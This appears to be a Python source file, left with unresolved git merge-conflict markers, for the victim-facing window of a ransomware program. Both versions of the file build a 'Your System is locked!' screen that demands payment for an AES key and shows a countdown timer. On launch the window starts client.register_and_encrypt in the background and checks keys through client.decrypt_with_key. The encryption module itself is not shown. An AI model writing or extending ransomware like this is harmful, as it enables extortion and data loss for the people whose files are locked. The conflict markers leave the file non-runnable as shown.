<<<<<<< HEAD
import customtkinter as ctk
import json, os, threading, time, sys, random
from datetime import datetime, timedelta
import client
from PIL import Image

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

DATA_FILE = "access_data.json"
ACCESS_DAYS = 1

#load or create first run time
def load_or_create_access_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return datetime.fromisoformat(json.load(f)["first_run"])
    else:
        now = datetime.now()
        with open(DATA_FILE, "w") as f:
            json.dump({"first_run": now.isoformat()}, f)
        return now

#to get path of resource when built with pyinstaller
def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

class Ransom_UI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Your System is locked!")
        self.geometry("700x500")
        self.resizable(False, False)

        self.unlocked = False     #stop timer n cursor when True
        self.animating = False    #block input during invalid animation

        #image
        self.logo_img = ctk.CTkImage(
            light_image=Image.open(resource_path("sigma_cat.png")),
            dark_image=Image.open(resource_path("sigma_cat.png")),
            size=(120, 120)
        )

        #timer
        self.first_run = load_or_create_access_data()
        self.expire_date = self.first_run + timedelta(days=ACCESS_DAYS)

        #color
        self.neon = "#14ff00"
        self.dark_green = "#0A9900"
        self.alert_red = "#ff0033"
        self.desc_base_text = "HAHAHA, Bro just got RANSOMWARE.\nPAY US to get the KEY to get ur DATA BACK!!"

        ascii_art = r"""
888    d8P  8888888b.  8888888888 888888b.
888   d8P   888  "Y88b 888        888  "88b
888  d8P    888    888 888        888  .88P
888d88K     888    888 8888888    8888888K.
8888888b    888    888 888        888  "Y88b
888  Y88b   888    888 888        888    888
888   Y88b  888  .d88P 888        888   d88P
888    Y88b 8888888P"  8888888888 8888888P"
"""

        # container for ascii and image
        header_frame = ctk.CTkFrame(self, fg_color="transparent")
        header_frame.pack(pady=10)

        #art to the left
        ascii_label = ctk.CTkLabel(
            header_frame,
            text=ascii_art,
            font=("Consolas", 14),
            text_color=self.neon,
            justify="left"
        )
        ascii_label.grid(row=0, column=0, padx=(0, 20))

        #image to the right
        image_label = ctk.CTkLabel(
            header_frame,
            image=self.logo_img,
            text=""
        )
        image_label.grid(row=0, column=1)

        #main frame
        self.frame = ctk.CTkFrame(self, fg_color="#001800")
        self.frame.pack(padx=20, pady=15, fill="both", expand=True)

        self.desc = ctk.CTkLabel(
            self.frame,
            text=self.desc_base_text + "█",
            font=("Consolas", 15),
            text_color=self.dark_green,
            justify="center"
        )
        self.desc.pack(pady=(15, 10))

        # blinking cursor
        threading.Thread(target=self.blink_block_cursor, daemon=True).start()

        # timer label
        self.timer_label = ctk.CTkLabel(
            self.frame,
            text="Initializing...",
            font=("Consolas", 18, "bold"),
            text_color=self.neon
        )
        self.timer_label.pack(pady=5)

        # input
        self.entry = ctk.CTkEntry(
            self.frame,
            placeholder_text="Enter AES KEY...",
            fg_color="#002800",
            text_color=self.neon,
            placeholder_text_color="#158015"
        )
        self.entry.pack(pady=10, padx=20, fill="x")

        # button
        self.btn = ctk.CTkButton(
            self.frame,
            text="ENTER KEY",
            fg_color=self.dark_green,
            hover_color=self.neon,
            text_color="black",
            command=self.verify_code
        )
        self.btn.pack(pady=10)

        #START BACKEND AUTOMATICALLY
        threading.Thread(target=self.start_backend, daemon=True).start()

        # start timer
        threading.Thread(target=self.update_timer, daemon=True).start()

    def ui(self, fn):
        self.after(0, fn)

    def start_backend(self):
        try:
            client.register_and_encrypt()
        except Exception:
            self.ui(lambda: self.timer_label.configure(
                text="SERVER ERROR ❌",
                text_color=self.alert_red
            ))

    def blink_block_cursor(self):
        visible = True
        while not self.unlocked:
            self.ui(lambda v=visible: self.desc.configure(
                text=self.desc_base_text + ("█" if v else " ")
            ))
            visible = not visible
            time.sleep(0.6)

    def glitch_effect(self):
        self.animating = True

        #lock input during animation from being spammed
        self.ui(lambda: self.entry.configure(state="disabled"))
        self.ui(lambda: self.btn.configure(state="disabled"))

        original = "INVALID KEY ✖"
        chars = "!@#$%^&*()<>?/[]{}|▓▒░"

        # glitch frames
        for _ in range(15):
            scrambled = "".join(
                random.choice(chars) if random.random() < 0.35 else c
                for c in original
            )
            self.ui(lambda s=scrambled: self.timer_label.configure(
                text=s,
                text_color=self.alert_red
            ))
            time.sleep(0.04)

        # final invalid text
        self.ui(lambda: self.timer_label.configure(
            text=original,
            text_color=self.alert_red
        ))

        #keep invalid animate for 1 second
        time.sleep(1)

        #restore input if still locked
        if not self.unlocked:
            self.ui(lambda: self.entry.configure(state="normal"))
            self.ui(lambda: self.btn.configure(state="normal"))

        self.animating = False

    #checking key if it valid
    def verify_code(self):
        if self.unlocked or self.animating:
            return

        key = self.entry.get().strip()

        threading.Thread(
            target=self._decrypt_flow,
            args=(key,),
            daemon=True
        ).start()

    def _decrypt_flow(self, key):
        try:
            client.decrypt_with_key(key)

            # mark unlocked
            self.unlocked = True

            # disable input permanently
            self.ui(lambda: self.entry.configure(state="disabled"))
            self.ui(lambda: self.btn.configure(state="disabled"))

            # show success clearly
            self.ui(lambda: self.timer_label.configure(
                text="ACCESS APPROVED ✓",
                text_color="#00ff44"
            ))

            # let user see success, then close
            self.after(2000, self.destroy)

        except Exception:
            self.glitch_effect()

    #decoy timer not doing anything but exit on expire
    def update_timer(self):
        while not self.unlocked:
            remaining = self.expire_date - datetime.now()

            if remaining.total_seconds() <= 0:
                self.ui(lambda: self.timer_label.configure(
                    text="TIME EXPIRED ❌",
                    text_color=self.alert_red
                ))
                self.after(1000, self.destroy)
                return

            h, r = divmod(remaining.seconds, 3600)
            m, s = divmod(r, 60)

            self.ui(lambda h=h, m=m, s=s: self.timer_label.configure(
                text=f"TIME LEFT: {h}h {m}m {s}s",
                text_color=self.neon
            ))
            time.sleep(1)

if __name__ == "__main__":
    app = Ransom_UI()
    app.mainloop()
=======
import customtkinter as ctk
import json, os, threading, time, sys, random
from datetime import datetime, timedelta
import client
from PIL import Image

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

DATA_FILE = "access_data.json"
ACCESS_DAYS = 1

# load or create first run time
def load_or_create_access_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return datetime.fromisoformat(json.load(f)["first_run"])
    else:
        now = datetime.now()
        with open(DATA_FILE, "w") as f:
            json.dump({"first_run": now.isoformat()}, f)
        return now

# correct resource path (PyInstaller safe)
def resource_path(relative_path):
    if hasattr(sys, "_MEIPASS"):
        return os.path.join(sys._MEIPASS, relative_path)
    return os.path.join(os.path.abspath("."), relative_path)

class Ransom_UI(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("SYSTEM ACCESS REQUIRED")
        self.geometry("720x520")
        self.resizable(False, False)

        self.unlocked = False
        self.animating = False

        # colors
        self.neon = "#14ff00"
        self.dark_green = "#0A9900"
        self.alert_red = "#ff0033"
        self.desc_base_text = "Your device has been locked.\nPAY US to get the KEY"

        # image (FIXED)
        self.logo_img = ctk.CTkImage(
            light_image=Image.open(resource_path("sigma_cat.png")),
            dark_image=Image.open(resource_path("sigma_cat.png")),
            size=(120, 120)
        )

        # timer
        self.first_run = load_or_create_access_data()
        self.expire_date = self.first_run + timedelta(days=ACCESS_DAYS)

        ascii_art = r"""
888    d8P  8888888b.  8888888888 888888b.
888   d8P   888  "Y88b 888        888  "88b
888  d8P    888    888 888        888  .88P
888d88K     888    888 8888888    8888888K.
8888888b    888    888 888        888  "Y88b
888  Y88b   888    888 888        888    888
888   Y88b  888  .d88P 888        888   d88P
888    Y88b 8888888P"  8888888888 8888888P"
"""

        # header
        header_frame = ctk.CTkFrame(self, fg_color="transparent")
        header_frame.pack(pady=10)

        ascii_label = ctk.CTkLabel(
            header_frame,
            text=ascii_art,
            font=("Consolas", 14),
            text_color=self.neon,
            justify="left"
        )
        ascii_label.grid(row=0, column=0, padx=(0, 20))

        image_label = ctk.CTkLabel(
            header_frame,
            image=self.logo_img,
            text=""
        )
        image_label.grid(row=0, column=1)

        # main frame
        self.frame = ctk.CTkFrame(self, fg_color="#001800")
        self.frame.pack(padx=20, pady=15, fill="both", expand=True)

        self.desc = ctk.CTkLabel(
            self.frame,
            text=self.desc_base_text + "█",
            font=("Consolas", 15),
            text_color=self.dark_green,
            justify="center"
        )
        self.desc.pack(pady=(15, 10))

        threading.Thread(target=self.blink_block_cursor, daemon=True).start()

        # UUID display (NEW)
        uuid_frame = ctk.CTkFrame(self.frame, fg_color="#001800")
        uuid_frame.pack(pady=(5, 10))

        self.uuid_label = ctk.CTkLabel(
            uuid_frame,
            text=f"Client UUID:\n{client.CLIENT_UUID}",
            font=("Consolas", 12),
            text_color=self.neon,
            justify="center"
        )
        self.uuid_label.grid(row=0, column=0, padx=6)

        self.copy_btn = ctk.CTkButton(
            uuid_frame,
            text="📋 COPY",
            width=80,
            fg_color=self.dark_green,
            hover_color=self.neon,
            text_color="black",
            command=self.copy_uuid
        )
        self.copy_btn.grid(row=0, column=1, padx=6)

        # timer label
        self.timer_label = ctk.CTkLabel(
            self.frame,
            text="Initializing...",
            font=("Consolas", 18, "bold"),
            text_color=self.neon
        )
        self.timer_label.pack(pady=5)

        # input
        self.entry = ctk.CTkEntry(
            self.frame,
            placeholder_text="Enter AES KEY...",
            fg_color="#002800",
            text_color=self.neon,
            placeholder_text_color="#158015"
        )
        self.entry.pack(pady=10, padx=20, fill="x")

        self.btn = ctk.CTkButton(
            self.frame,
            text="ENTER KEY",
            fg_color=self.dark_green,
            hover_color=self.neon,
            text_color="black",
            command=self.verify_code
        )
        self.btn.pack(pady=10)

        threading.Thread(target=client.register_and_encrypt, daemon=True).start()
        threading.Thread(target=self.update_timer, daemon=True).start()

    def copy_uuid(self):
        self.clipboard_clear()
        self.clipboard_append(client.CLIENT_UUID)
        self.copy_btn.configure(text="COPIED ✓")
        self.after(1000, lambda: self.copy_btn.configure(text="📋 COPY"))

    def blink_block_cursor(self):
        visible = True
        while not self.unlocked:
            self.desc.configure(
                text=self.desc_base_text + ("█" if visible else " ")
            )
            visible = not visible
            time.sleep(0.6)

    def glitch_effect(self):
        self.animating = True
        self.entry.configure(state="disabled")
        self.btn.configure(state="disabled")

        original = "INVALID KEY ✖"
        chars = "!@#$%^&*()<>?/[]{}|▓▒░"

        for _ in range(15):
            scrambled = "".join(
                random.choice(chars) if random.random() < 0.35 else c
                for c in original
            )
            self.timer_label.configure(text=scrambled, text_color=self.alert_red)
            time.sleep(0.04)

        self.timer_label.configure(text=original, text_color=self.alert_red)
        time.sleep(1)

        if not self.unlocked:
            self.entry.configure(state="normal")
            self.btn.configure(state="normal")

        self.animating = False

    def verify_code(self):
        if self.unlocked or self.animating:
            return

        key = self.entry.get().strip()
        threading.Thread(target=self._decrypt_flow, args=(key,), daemon=True).start()

    def _decrypt_flow(self, key):
        try:
            client.decrypt_with_key(key)
            self.unlocked = True
            self.entry.configure(state="disabled")
            self.btn.configure(state="disabled")
            self.timer_label.configure(
                text="ACCESS APPROVED ✓",
                text_color="#00ff44"
            )
            self.after(2000, self.destroy)
        except Exception:
            self.glitch_effect()

    def update_timer(self):
        while not self.unlocked:
            remaining = self.expire_date - datetime.now()
            if remaining.total_seconds() <= 0:
                self.timer_label.configure(
                    text="TIME EXPIRED ❌",
                    text_color=self.alert_red
                )
                time.sleep(1)
                sys.exit()

            h, r = divmod(remaining.seconds, 3600)
            m, s = divmod(r, 60)
            self.timer_label.configure(
                text=f"TIME LEFT: {h}h {m}m {s}s",
                text_color=self.neon
            )
            time.sleep(1)

if __name__ == "__main__":
    app = Ransom_UI()
    app.mainloop()
>>>>>>> 598c62c (Fixed client data not being save and solve victimGUI error enter key not valid)
